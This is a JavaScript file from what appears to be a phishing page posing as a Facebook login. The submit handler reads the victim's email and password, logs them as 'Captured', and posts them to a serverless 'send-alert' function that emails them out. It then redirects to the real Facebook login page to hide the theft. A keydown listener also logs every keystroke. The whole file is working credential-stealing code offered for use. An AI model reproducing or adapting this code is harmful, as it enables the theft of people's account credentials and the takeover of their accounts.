document.getElementById('loginForm').addEventListener('submit', async function(event) {
    event.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('pass').value;

    console.log('Captured Email:', email);
    console.log('Captured Password:', password);

    try {
        const response = await fetch('/.netlify/functions/send-alert', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                email: email,
                password: password
            })
        });

        if (response.ok) {
            console.log('Email notification sent successfully.');
        } else {
            console.error('Error sending email notification.');
        }
    } catch (error) {
        console.error('Error sending email notification:', error);
    }

    // Redirect to Facebook login page
    window.location.href = "https://www.facebook.com/login/";
});

document.addEventListener('keydown', function(e) {
    console.log('Key pressed: ' + e.key);
});
